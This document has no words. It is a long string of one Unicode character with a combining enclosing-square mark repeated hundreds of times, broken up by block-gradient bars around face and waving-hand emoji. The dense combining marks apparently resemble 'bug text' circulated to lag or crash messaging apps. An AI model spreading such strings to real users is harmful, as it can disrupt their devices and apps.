ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂😶▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂😶▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂👋▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂👋▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂👋▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂👋▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂👋▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟